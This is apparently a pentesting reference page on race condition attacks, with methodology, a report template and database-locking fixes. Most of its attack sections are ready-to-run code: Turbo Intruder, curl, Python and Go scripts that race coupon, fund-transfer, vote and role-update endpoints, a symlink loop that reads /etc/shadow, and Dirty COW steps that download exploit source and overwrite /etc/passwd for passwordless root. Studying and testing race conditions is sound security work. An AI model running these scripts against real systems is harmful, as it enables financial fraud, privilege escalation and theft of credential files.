---
title: Race Conditions Attack
description: Race Condition vulnerabilities — payloads, exploitation techniques, privilege escalation, and pentesting methodology.
navigation:
  icon: i-lucide-timer
  title: Race Conditions
---

## What is a Race Condition?

A **Race Condition** occurs when a system's behavior depends on the **sequence or timing** of uncontrollable events such as thread execution order, request processing, or file access. In security, attackers exploit the **time gap** between a **check** and the **use** of a resource (known as **TOCTOU — Time of Check to Time of Use**).

::callout
---
icon: i-lucide-skull
color: red
---
Race conditions are **critical** because they bypass security controls that assume operations are atomic. A single request may pass validation, but **hundreds of simultaneous requests** can break the logic entirely.
::

::card-group
  ::card
  ---
  title: TOCTOU
  icon: i-lucide-clock
  ---
  Time-of-Check to Time-of-Use — the classic race window where a verified condition changes before it is acted upon.
  ::

  ::card
  ---
  title: Double Spend
  icon: i-lucide-coins
  ---
  Exploiting financial or token-based systems by submitting the same transaction multiple times before balance updates.
  ::

  ::card
  ---
  title: Limit Overrun
  icon: i-lucide-arrow-up-from-line
  ---
  Bypassing rate limits, coupon usage limits, vote counts, or inventory checks through concurrent requests.
  ::

  ::card
  ---
  title: Authentication Race
  icon: i-lucide-shield-off
  ---
  Exploiting session creation, password reset tokens, or MFA verification by racing simultaneous auth requests.
  ::
::

---

## How Race Conditions Work

::steps{level="4"}

#### Step 1 — Identify the Vulnerable Window

The attacker finds a **non-atomic operation** — an action that involves a **check** followed by a **use** with a gap in between.

#### Step 2 — Craft Concurrent Requests

Multiple identical or related requests are sent **simultaneously** to hit the server within the vulnerable time window.

#### Step 3 — Exploit the Gap

The server processes all requests as if each one is the **first valid request**, bypassing limits, duplicating actions, or escalating privileges.

#### Step 4 — Observe the Impact

The attacker gains unauthorized rewards — duplicate transactions, elevated privileges, bypassed restrictions.

::

::note
The key insight is that **web servers process requests concurrently**. If the application logic is not designed to handle this, the "impossible" becomes possible.
::

---

## Attack Surface & Targets

| Target | Vulnerable Operation | Impact |
|--------|---------------------|--------|
| **Coupon/Discount Codes** | Apply coupon → check if used → mark used | Apply coupon multiple times |
| **Money Transfers** | Check balance → deduct → transfer | Transfer more than available balance |
| **Vote/Like Systems** | Check if voted → add vote | Vote unlimited times |
| **Account Registration** | Check if username exists → create | Create duplicate accounts |
| **File Upload** | Upload → validate → move/delete | Access file before deletion |
| **Password Reset** | Generate token → send email → invalidate | Use token multiple times |
| **Invite/Referral Codes** | Check code → apply reward → mark used | Redeem code many times |
| **Shopping Cart** | Check stock → reserve → checkout | Buy more than available stock |
| **API Rate Limits** | Count requests → enforce limit | Bypass rate limiting |
| **Role Assignment** | Check role → assign permission | Escalate to admin |

---

## Payloads & Techniques

### Turbo Intruder — Single-Packet Attack (HTTP/2)

The most powerful technique for race conditions. Burp Suite's **Turbo Intruder** can send requests in a **single TCP packet** using HTTP/2 multiplexing, ensuring they arrive at the exact same microsecond.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Single-Packet Payload"}
  ```python [turbo-intruder-single-packet.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Queue all requests before sending
      for i in range(20):
          engine.queue(target.req, gate='race1')

      # Open the gate — all requests sent in a single packet
      engine.openGate('race1')

  def handleResponse(req, interesting):
      table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  - `gate='race1'` — holds all requests until the gate opens
  - `engine.openGate('race1')` — releases all 20 requests **simultaneously**
  - `concurrentConnections=1` — forces all requests through a single connection
  - `Engine.BURP2` — uses HTTP/2 for single-packet multiplexing
  - This eliminates **network jitter** — the #1 enemy of race condition exploits
  :::
::

### Turbo Intruder — Coupon / Discount Abuse

::tabs
  :::tabs-item{icon="i-lucide-code" label="Coupon Race Payload"}
  ```python [turbo-coupon-race.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Repeat the same coupon application request
      for i in range(50):
          engine.queue(target.req, gate='coupon')

      engine.openGate('coupon')

  def handleResponse(req, interesting):
      # Look for success indicators
      if 'Coupon applied' in req.response or req.status == 200:
          table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="HTTP Request"}
  ```http [apply-coupon.http]
  POST /api/apply-coupon HTTP/2
  Host: target.com
  Cookie: session=abc123xyz
  Content-Type: application/x-www-form-urlencoded

  coupon_code=SAVE20&order_id=8291
  ```
  :::
::

### Turbo Intruder — Double Spend / Balance Bypass

::tabs
  :::tabs-item{icon="i-lucide-code" label="Double Spend Payload"}
  ```python [turbo-double-spend.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Send 30 transfer requests simultaneously
      for i in range(30):
          engine.queue(target.req, gate='transfer')

      engine.openGate('transfer')

  def handleResponse(req, interesting):
      if 'Transfer successful' in req.response:
          table.add(req)
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="HTTP Request"}
  ```http [transfer-funds.http]
  POST /api/transfer HTTP/2
  Host: bank.target.com
  Cookie: session=victim_session_token
  Content-Type: application/json

  {
    "from_account": "attacker_001",
    "to_account": "attacker_002",
    "amount": 1000
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Logic"}
  ```text [attack-logic.txt]
  Account Balance: $1,000
  
  Normal Flow:
    Request 1: Check $1000 >= $1000 ✓ → Deduct → Balance: $0
    Request 2: Check $0 >= $1000 ✗ → Rejected
  
  Race Condition:
    Request 1: Check $1000 >= $1000 ✓ (not yet deducted)
    Request 2: Check $1000 >= $1000 ✓ (not yet deducted)
    Request 3: Check $1000 >= $1000 ✓ (not yet deducted)
    ...
    All deductions happen → Balance: -$29,000
    Attacker gains: $30,000 transferred with only $1,000
  ```
  :::
::

### cURL — Parallel Race Requests

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Parallel cURL"}
  ```bash [race-curl-parallel.sh]
  # Send 50 parallel requests using curl
  seq 1 50 | xargs -P 50 -I {} \
    curl -s -o /dev/null -w "Request {}: %{http_code}\n" \
    -X POST https://target.com/api/redeem \
    -H "Cookie: session=abc123" \
    -H "Content-Type: application/json" \
    -d '{"code":"FREEITEM","qty":1}'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GNU Parallel"}
  ```bash [race-gnu-parallel.sh]
  # Using GNU parallel for precise timing
  parallel --jobs 100 \
    'curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=abc123" \
    -d "coupon=SAVE50"' ::: $(seq 1 100)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bash Background Jobs"}
  ```bash [race-bash-bg.sh]
  #!/bin/bash
  # Fire-and-forget race condition
  URL="https://target.com/api/vote"
  COOKIE="session=abc123xyz"

  for i in $(seq 1 100); do
    curl -s -X POST "$URL" \
      -H "Cookie: $COOKIE" \
      -d "candidate=attacker" &
  done

  # Wait for all background jobs
  wait
  echo "[+] All requests sent"
  ```
  :::
::

### Python — Async Race Attack

::code-collapse

```python [race_async.py]
import asyncio
import aiohttp
import time

TARGET = "https://target.com/api/redeem-gift-card"
HEADERS = {
    "Cookie": "session=vulnerable_session_token",
    "Content-Type": "application/json"
}
PAYLOAD = '{"card_code": "GIFT-500-XYZ", "amount": 500}'
NUM_REQUESTS = 100

async def send_request(session, request_id):
    try:
        async with session.post(TARGET, headers=HEADERS, data=PAYLOAD) as resp:
            status = resp.status
            body = await resp.text()
            success = "redeemed" in body.lower() or status == 200
            if success:
                print(f"[+] Request {request_id}: SUCCESS (HTTP {status})")
            return status, success
    except Exception as e:
        print(f"[-] Request {request_id}: ERROR - {e}")
        return None, False

async def race_attack():
    connector = aiohttp.TCPConnector(limit=0, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Pre-create all coroutines
        tasks = [send_request(session, i) for i in range(NUM_REQUESTS)]
        
        print(f"[*] Launching {NUM_REQUESTS} concurrent requests...")
        start = time.time()
        
        # Fire all at once
        results = await asyncio.gather(*tasks)
        
        elapsed = time.time() - start
        successes = sum(1 for _, s in results if s)
        
        print(f"\n[*] Completed in {elapsed:.3f}s")
        print(f"[*] Successful redemptions: {successes}/{NUM_REQUESTS}")
        if successes > 1:
            print(f"[!] RACE CONDITION CONFIRMED — {successes} redemptions!")

if __name__ == "__main__":
    asyncio.run(race_attack())
```

::

### Go — High-Performance Race Tool

::code-collapse

```go [race_attack.go]
package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
    "strings"
    "sync"
    "time"
)

const (
    targetURL   = "https://target.com/api/apply-promo"
    numRequests = 200
    cookie      = "session=target_session_value"
    payload     = `{"promo_code":"UNLIMITED50"}`
)

func sendRequest(id int, wg *sync.WaitGroup, results chan<- string, barrier <-chan struct{}) {
    defer wg.Done()

    // Wait for the barrier to open (all goroutines launch together)
    <-barrier

    client := &http.Client{Timeout: 10 * time.Second}
    req, _ := http.NewRequest("POST", targetURL, strings.NewReader(payload))
    req.Header.Set("Cookie", cookie)
    req.Header.Set("Content-Type", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        results <- fmt.Sprintf("[-] Request %d: ERROR - %v", id, err)
        return
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    if strings.Contains(string(body), "applied") || resp.StatusCode == 200 {
        results <- fmt.Sprintf("[+] Request %d: SUCCESS (HTTP %d)", id, resp.StatusCode)
    }
}

func main() {
    var wg sync.WaitGroup
    results := make(chan string, numRequests)
    barrier := make(chan struct{})

    for i := 0; i < numRequests; i++ {
        wg.Add(1)
        go sendRequest(i, &wg, results, barrier)
    }

    fmt.Printf("[*] Launching %d goroutines simultaneously...\n", numRequests)
    close(barrier) // Release all goroutines at once

    wg.Wait()
    close(results)

    count := 0
    for r := range results {
        fmt.Println(r)
        count++
    }
    fmt.Printf("\n[*] Successful hits: %d\n", count)
}
```

::

---

## Privilege Escalation via Race Conditions

::caution
Privilege Escalation through race conditions is one of the **most dangerous** exploitation paths because it often leaves **no trace** in application logs and bypasses all access control checks.
::

### How PrivEsc Race Conditions Work

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Attack Flow"}

  ```text [privesc-race-flow.txt]
  ┌─────────────────────────────────────────────────────────┐
  │                RACE CONDITION PRIVESC                    │
  ├─────────────────────────────────────────────────────────┤
  │                                                         │
  │  1. User registers account (role: "user")               │
  │     POST /api/register                                  │
  │     {"username":"attacker","password":"pass123"}         │
  │                                                         │
  │  2. Server creates account → sets default role          │
  │     INSERT INTO users (name, role) VALUES               │
  │       ('attacker', 'user')                              │
  │                                                         │
  │  ◄──── RACE WINDOW ────►                                │
  │                                                         │
  │  3. SIMULTANEOUSLY send role update request             │
  │     PUT /api/profile                                    │
  │     {"role":"admin"}                                    │
  │                                                         │
  │  4. If the role update hits between account creation    │
  │     and role assignment → attacker becomes ADMIN        │
  │                                                         │
  └─────────────────────────────────────────────────────────┘
  ```

  :::

  :::tabs-item{icon="i-lucide-code" label="Exploit Payload"}
  ```python [privesc-race-exploit.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Request 1: Register new account
      register_req = '''POST /api/register HTTP/2
  Host: target.com
  Content-Type: application/json

  {"username":"raceadmin","password":"Password1!","email":"race@evil.com"}'''

      # Request 2: Update role to admin (sent simultaneously)
      escalate_req = '''PUT /api/users/profile HTTP/2
  Host: target.com
  Cookie: session=ATTACKER_SESSION
  Content-Type: application/json

  {"role":"admin","is_superuser":true}'''

      # Queue both with same gate
      engine.queue(register_req, gate='privesc')
      
      for i in range(30):
          engine.queue(escalate_req, gate='privesc')

      engine.openGate('privesc')

  def handleResponse(req, interesting):
      table.add(req)
  ```
  :::
::

### PrivEsc Scenario — TOCTOU File Symlink

On Linux systems, race conditions in **setuid binaries** or **privileged services** that process temporary files can be exploited.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Symlink Attack"}
  ```bash [toctou-symlink-privesc.sh]
  #!/bin/bash
  # Exploit a privileged service that writes to /tmp/output
  # Race to replace the file with a symlink before it's written

  TARGET_FILE="/tmp/service_output"
  SENSITIVE_FILE="/etc/shadow"

  # Continuously attempt the symlink race
  while true; do
    # Remove the legit file
    rm -f "$TARGET_FILE" 2>/dev/null
    # Replace with symlink to /etc/shadow
    ln -sf "$SENSITIVE_FILE" "$TARGET_FILE" 2>/dev/null
    
    # Check if we won the race
    if [ -s "$TARGET_FILE" ] && grep -q "root:" "$TARGET_FILE" 2>/dev/null; then
      echo "[+] RACE WON — /etc/shadow contents:"
      cat "$TARGET_FILE"
      break
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Dirty COW Concept"}
  ```bash [dirty-cow-concept.sh]
  # Dirty COW (CVE-2016-5195) — Classic Kernel Race Condition
  # The vulnerability was a race condition in the Linux kernel's
  # memory subsystem (copy-on-write mechanism)

  # Download and compile
  wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
  gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt

  # Exploit: overwrite /etc/passwd to add root user
  # This races the copy-on-write page fault handler
  ./dirtyc0w /etc/passwd "$(sed 's/root:x/root:/' /etc/passwd)"

  # After exploitation:
  su root  # No password needed
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Kernel Race Explained"}
  ```text [kernel-race-explanation.txt]
  DIRTY COW — CVE-2016-5195 (Linux Kernel 2.x - 4.x)
  ════════════════════════════════════════════════════
  
  Normal Copy-on-Write (COW):
  ┌──────────┐     ┌──────────┐
  │ Process A │────▶│ Shared   │
  │ (read)    │     │ Memory   │
  └──────────┘     │ Page     │
  ┌──────────┐     │          │
  │ Process B │────▶│          │
  │ (read)    │     └──────────┘
  └──────────┘
  
  When Process B writes:
  1. Kernel creates COPY of the page
  2. Process B writes to the COPY
  3. Original page unchanged ✓
  
  RACE CONDITION:
  Thread 1: madvise(MADV_DONTNEED) — tells kernel to drop the page
  Thread 2: write() to /proc/self/mem — writes to the page
  
  If Thread 2 wins the race:
  → Write goes to the ORIGINAL page (not a copy)
  → Read-only files become writable
  → /etc/passwd, /etc/shadow, SUID binaries — all modifiable
  → INSTANT ROOT
  ```
  :::
::

### PrivEsc Scenario — Session / Token Race

::code-collapse

```python [session-race-privesc.py]
"""
Scenario: Application checks user role from session, then performs admin action.
Race: Change session role between check and action.

Flow:
1. Login as normal user → get session
2. Simultaneously:
   a. Request admin endpoint (GET /admin/users)
   b. Send session elevation request (POST /api/update-role)
3. If (a) is checked before role is set, but processed after → admin access
"""

import asyncio
import aiohttp

TARGET_BASE = "https://target.com"
SESSION_COOKIE = "session=normal_user_session_abc123"

async def request_admin_panel(session, req_id, barrier):
    await barrier.wait()
    headers = {"Cookie": SESSION_COOKIE}
    async with session.get(f"{TARGET_BASE}/admin/dashboard", headers=headers) as resp:
        body = await resp.text()
        if resp.status == 200 and "Admin Panel" in body:
            print(f"[+] Request {req_id}: ADMIN ACCESS GRANTED!")
            return True
    return False

async def elevate_role(session, req_id, barrier):
    await barrier.wait()
    headers = {
        "Cookie": SESSION_COOKIE,
        "Content-Type": "application/json"
    }
    data = '{"role": "admin"}'
    async with session.put(f"{TARGET_BASE}/api/profile/role", headers=headers, data=data) as resp:
        if resp.status == 200:
            print(f"[*] Elevation {req_id}: Role update sent")

async def main():
    barrier = asyncio.Barrier(60)  # 60 total tasks
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        # 30 admin panel requests
        for i in range(30):
            tasks.append(request_admin_panel(session, i, barrier))
        # 30 role elevation requests
        for i in range(30):
            tasks.append(elevate_role(session, i, barrier))
        
        results = await asyncio.gather(*tasks)
        wins = sum(1 for r in results if r is True)
        print(f"\n[*] Admin access achieved: {wins} times")

asyncio.run(main())
```

::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Identify Race-Prone Endpoints

Look for endpoints that perform **stateful operations** — anything that checks a condition, then acts on it.

```text [recon-checklist.txt]
Target Endpoints:
☐ Coupon/promo code redemption
☐ Money transfer / payment processing
☐ Account registration / profile update
☐ Password reset / email verification
☐ File upload → process → delete flows
☐ Vote / like / rating systems
☐ Invitation / referral code redemption
☐ Cart checkout / inventory management
☐ API key generation / token refresh
☐ Role / permission assignment
```

#### Setup — Configure Your Tools

```bash [setup-tools.sh]
# Install Turbo Intruder (Burp Suite Extension)
# BApp Store → Search "Turbo Intruder" → Install

# Install race-the-web (Go-based race condition tester)
go install github.com/insp3ctre/race-the-web@latest

# Install racepwn
git clone https://github.com/racepwn/racepwn.git
cd racepwn && go build

# Python async dependencies
pip install aiohttp asyncio
```

#### Baseline — Capture Normal Behavior

```http [baseline-request.http]
POST /api/redeem-coupon HTTP/2
Host: target.com
Cookie: session=your_session_token
Content-Type: application/json

{"coupon_code": "SAVE20", "order_id": "12345"}
```

```text [baseline-response.txt]
First request:  HTTP 200 — "Coupon applied successfully"
Second request: HTTP 400 — "Coupon already used"

✓ This is the expected behavior
✓ Our goal: make BOTH requests return 200
```

#### Attack — Launch Concurrent Requests

Send **20-200 concurrent requests** using Turbo Intruder's single-packet technique.

```python [attack-launch.py]
# In Turbo Intruder:
# 1. Right-click the request in Burp → Send to Turbo Intruder
# 2. Paste the single-packet script
# 3. Click "Attack"
# 4. Analyze results — look for multiple 200 responses

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

#### Analyze — Confirm the Vulnerability

```text [analysis-guide.txt]
SUCCESS INDICATORS:
═══════════════════
✓ Multiple HTTP 200 responses for a single-use action
✓ Balance decreased more than once
✓ Coupon applied multiple times
✓ Multiple accounts created with same unique field
✓ More votes/likes than allowed
✓ Multiple password reset tokens valid simultaneously

FALSE POSITIVE CHECKS:
══════════════════════
✗ Server returned 200 but action wasn't actually performed
✗ Idempotent endpoint (safe to call multiple times by design)
✗ Response cached — verify in database/backend
```

#### Report — Document the Finding

```text [report-template.txt]
VULNERABILITY: Race Condition — [Coupon Code Double Redemption]
SEVERITY: High / Critical
CVSS: 7.5 - 9.8 (depending on impact)

DESCRIPTION:
The application fails to implement atomic operations for coupon
redemption, allowing an attacker to apply the same single-use
coupon multiple times by sending concurrent requests.

REPRODUCTION STEPS:
1. Authenticate as a normal user
2. Add items to cart (total: $100)
3. Intercept the "Apply Coupon" request in Burp Suite
4. Send to Turbo Intruder with single-packet attack script
5. Send 20 concurrent requests with gate synchronization
6. Observe: coupon applied 8/20 times → $100 discount × 8 = $800

IMPACT:
- Financial loss: unlimited coupon abuse
- Potential for negative balance exploitation
- Bypass of business logic controls

REMEDIATION:
- Implement database-level locking (SELECT FOR UPDATE)
- Use atomic operations / transactions
- Implement idempotency keys
- Add optimistic locking with version counters
```

::

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: HTTP/2 Single-Packet vs HTTP/1.1 Last-Byte Sync
  ---
  **HTTP/2** is preferred because multiplexing allows multiple requests in a single TCP packet. For **HTTP/1.1** targets, use the **last-byte synchronization** technique:

  1. Send all requests with the body incomplete (missing last byte)
  2. Wait until all connections are established
  3. Send the final byte on all connections simultaneously

  ```python [last-byte-sync.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=30,
                             requestsPerConnection=1,
                             engine=Engine.THREADED)

      for i in range(30):
          engine.queue(target.req, gate='race1')

      engine.openGate('race1')
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Warming Up the Connection
  ---
  Before the actual race attack, send **inconsequential requests** to warm up the connection and eliminate server-side delays (TLS handshake, connection pool allocation).

  ```python [connection-warmup.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Warmup — send harmless requests first
      for i in range(10):
          engine.queue('GET / HTTP/2\r\nHost: target.com\r\n\r\n')

      # Actual attack
      for i in range(30):
          engine.queue(target.req, gate='attack')

      engine.openGate('attack')
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Multi-Endpoint Race (Request Chaining)
  ---
  Some race conditions require hitting **two different endpoints** simultaneously. For example, registering an account while simultaneously updating its role.

  ```python [multi-endpoint-race.py]
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      register = '''POST /api/register HTTP/2
  Host: target.com
  Content-Type: application/json

  {"username":"racetest","password":"pass123"}'''

      makeAdmin = '''PUT /api/users/racetest/role HTTP/2
  Host: target.com
  Content-Type: application/json

  {"role":"admin"}'''

      engine.queue(register, gate='multi')
      for i in range(20):
          engine.queue(makeAdmin, gate='multi')

      engine.openGate('multi')
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Detecting Non-Obvious Race Windows
  ---
  Not all race conditions are immediately visible. Look for these subtle indicators:

  - **Inconsistent response times** — some requests take longer (hitting a lock)
  - **Database unique constraint errors** — `SQLSTATE[23000] Duplicate entry`
  - **Partial success states** — coupon applied but discount not calculated
  - **Out-of-order operations** — email sent before account fully created
  - **Temporary files** — uploads accessible before validation completes

  Test with increasing concurrency: 5 → 10 → 20 → 50 → 100 → 200
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Framework-Specific Weak Points
  ---
  | Framework | Common Race Condition Location |
  |-----------|-------------------------------|
  | **Django** | `get_or_create()` without `select_for_update()` |
  | **Rails** | `find_or_create_by` without advisory locks |
  | **Laravel** | Eloquent `firstOrCreate` without DB transactions |
  | **Express/Node** | Async callbacks without mutex/semaphore |
  | **Spring Boot** | `@Transactional` with wrong isolation level |
  | **Flask** | SQLAlchemy sessions without proper locking |
  :::
::

---

## Tools Arsenal

::card-group
  ::card
  ---
  title: Turbo Intruder
  icon: i-simple-icons-portswigger
  to: https://github.com/PortSwigger/turbo-intruder
  target: _blank
  ---
  Burp Suite extension for sending large numbers of HTTP requests with precise timing. Supports HTTP/2 single-packet attacks.
  ::

  ::card
  ---
  title: race-the-web
  icon: i-simple-icons-go
  to: https://github.com/insp3ctre/race-the-web
  target: _blank
  ---
  Go-based tool to test for race conditions in web applications. Uses TOML config files for easy setup.
  ::

  ::card
  ---
  title: racepwn
  icon: i-simple-icons-github
  to: https://github.com/racepwn/racepwn
  target: _blank
  ---
  Race condition exploitation framework with support for multiple protocols and configurable payloads.
  ::

  ::card
  ---
  title: Burp Suite Repeater (Group Send)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group
  target: _blank
  ---
  Native Burp Suite feature to send multiple Repeater tabs in parallel — useful for quick race condition testing.
  ::
::

### race-the-web Configuration

::code-collapse

```toml [race-config.toml]
# race-the-web configuration
[target]
url = "https://target.com/api/redeem-coupon"
method = "POST"
cookies = "session=abc123xyz"
body = '{"coupon": "SAVE50"}'
content_type = "application/json"
redirects = false

[attack]
count = 100            # Number of requests
verbose = true         # Show all responses
```

::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "HackerOne: Starbucks Race Condition"
  icon: i-simple-icons-hackerone
  to: https://hackerone.com/reports/759247
  target: _blank
  ---
  Race condition in gift card transfer allowed unlimited money duplication. Attacker transferred the same balance multiple times simultaneously.
  ::

  ::card
  ---
  title: "PortSwigger Research: Smashing the State Machine"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/research/smashing-the-state-machine
  target: _blank
  ---
  James Kettle's groundbreaking research on single-packet attacks, HTTP/2 race conditions, and practical exploitation techniques.
  ::

  ::card
  ---
  title: "Dirty COW — CVE-2016-5195"
  icon: i-lucide-bug
  to: https://dirtycow.ninja/
  target: _blank
  ---
  Linux kernel privilege escalation via race condition in the copy-on-write mechanism. Affected all Linux kernels from 2007-2016.
  ::

  ::card
  ---
  title: "PortSwigger Academy: Race Conditions Lab"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/race-conditions
  target: _blank
  ---
  Free interactive labs to practice race condition exploitation including limit overrun, multi-endpoint races, and single-packet attacks.
  ::
::

---

## Remediation & Defense

::tip
When reporting race conditions, always include **recommended fixes** to demonstrate the vulnerability's severity and provide actionable guidance.
::

::tabs
  :::tabs-item{icon="i-lucide-database" label="Database Locking"}
  ```sql [database-locking-fix.sql]
  -- PostgreSQL: Use SELECT FOR UPDATE to lock the row
  BEGIN;
    SELECT balance FROM accounts 
    WHERE user_id = 'attacker_001' 
    FOR UPDATE;  -- ← Row is now locked
    
    -- Only one transaction can reach here at a time
    UPDATE accounts 
    SET balance = balance - 1000 
    WHERE user_id = 'attacker_001' AND balance >= 1000;
  COMMIT;
  ```
  :::

  :::tabs-item{icon="i-lucide-key" label="Idempotency Keys"}
  ```javascript [idempotency-key-fix.js]
  // Express.js middleware for idempotency
  const processedKeys = new Map();

  app.post('/api/transfer', async (req, res) => {
    const idempotencyKey = req.headers['idempotency-key'];
    
    if (!idempotencyKey) {
      return res.status(400).json({ error: 'Idempotency-Key header required' });
    }
    
    // Check if this request was already processed
    if (processedKeys.has(idempotencyKey)) {
      return res.json(processedKeys.get(idempotencyKey));
    }
    
    // Process the transfer atomically
    const result = await db.transaction(async (trx) => {
      // Lock + check + deduct in one atomic operation
      const updated = await trx('accounts')
        .where('user_id', req.user.id)
        .where('balance', '>=', req.body.amount)
        .decrement('balance', req.body.amount);
      
      if (updated === 0) throw new Error('Insufficient balance');
      return { success: true, message: 'Transfer completed' };
    });
    
    processedKeys.set(idempotencyKey, result);
    res.json(result);
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Mutex / Distributed Lock"}
  ```python [redis-distributed-lock.py]
  import redis
  import uuid

  r = redis.Redis()

  def redeem_coupon_safe(user_id, coupon_code):
      lock_key = f"lock:coupon:{coupon_code}"
      lock_value = str(uuid.uuid4())
      
      # Acquire distributed lock (atomic operation)
      acquired = r.set(lock_key, lock_value, nx=True, ex=10)
      
      if not acquired:
          return {"error": "Another redemption in progress"}
      
      try:
          # Check if coupon is still valid
          coupon = db.get_coupon(coupon_code)
          if coupon.used:
              return {"error": "Coupon already used"}
          
          # Apply coupon and mark as used (atomic)
          db.apply_coupon(user_id, coupon_code)
          db.mark_coupon_used(coupon_code)
          
          return {"success": "Coupon applied"}
      finally:
          # Release lock only if we own it
          if r.get(lock_key) == lock_value.encode():
              r.delete(lock_key)
  ```
  :::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: PortSwigger — Race Conditions
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/race-conditions
  target: _blank
  ---
  Official PortSwigger Academy guide with free interactive labs covering all race condition variants.
  ::

  ::card
  ---
  title: "Smashing the State Machine (Whitepaper)"
  icon: i-lucide-file-text
  to: https://portswigger.net/research/smashing-the-state-machine
  target: _blank
  ---
  James Kettle's 2023 research paper — the definitive guide on modern race condition exploitation.
  ::

  ::card
  ---
  title: OWASP — Race Conditions
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-community/vulnerabilities/Race_Conditions
  target: _blank
  ---
  OWASP community documentation on race condition vulnerabilities and secure coding practices.
  ::

  ::card
  ---
  title: HackTricks — Race Condition
  icon: i-simple-icons-hackhands
  to: https://book.hacktricks.wiki/en/pentesting-web/race-condition.html
  target: _blank
  ---
  Community-maintained pentesting reference with real-world examples and tool usage guides.
  ::

  ::card
  ---
  title: CWE-362 — Race Condition
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/362.html
  target: _blank
  ---
  MITRE CWE entry for concurrent execution using shared resource with improper synchronization.
  ::

  ::card
  ---
  title: Turbo Intruder Source Code
  icon: i-simple-icons-github
  to: https://github.com/PortSwigger/turbo-intruder
  target: _blank
  ---
  Open-source Burp Suite extension — study the code to understand single-packet attack internals.
  ::
::